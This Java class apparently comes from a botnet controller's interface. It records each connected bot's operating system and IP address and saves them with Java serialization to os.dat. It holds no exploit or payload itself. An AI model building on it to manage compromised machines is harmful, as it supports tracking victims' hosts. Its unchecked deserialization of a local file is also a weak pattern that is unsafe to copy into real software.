package com.redpois0n.ui.stats;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

import com.redpois0n.bot.Bot;


@SuppressWarnings("unchecked")
public class OsStats implements Serializable {
	
	private static final long serialVersionUID = 904453855311458163L;
	
	public static transient HashMap<String, OsStats> map = new HashMap<String, OsStats>();
	
	private String os;
	private List<String> ip = new ArrayList<String>();
	
	public OsStats(String os) {
		this.os = os;
	}
	
	/**
	 * Returns OS
	 * @return
	 */
	public String getOs() {
		return os;
	}
	
	/**
	 * Returns IP addresses already saved in the OS map
	 * @return
	 */
	public List<String> getIPs() {
		return ip;
	}

	/**
	 * Loads the stat map
	 * @throws Exception
	 */
	public static void load() throws Exception {
		ObjectInputStream in = new ObjectInputStream(new FileInputStream(getFile()));
		map = (HashMap<String, OsStats>) in.readObject();
		in.close();
	}
	
	/**
	 * Saves the stat map
	 * @throws Exception
	 */
	public static void save() throws Exception {
		ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(getFile()));
		out.writeObject(map);
		out.close();
	}

	/**
	 * Returns the file where it will be saved
	 * @return
	 */
	public static File getFile() {
		return new File("os.dat");
	}
	
	/**
	 * Adds the bots operating system to stats
	 * @param bot
	 */
	public static void add(Bot bot) {
		String os = bot.getOs().replace("_", " ");
		
		OsStats stats = map.get(os);
		
		if (stats != null){
			if (!stats.ip.contains(bot.getIP())) {
				stats.ip.add(bot.getIP());
			}
		} else {
			stats = new OsStats(os);
			map.put(os, stats);
			stats.ip.add(bot.getIP());
		}
	}

}
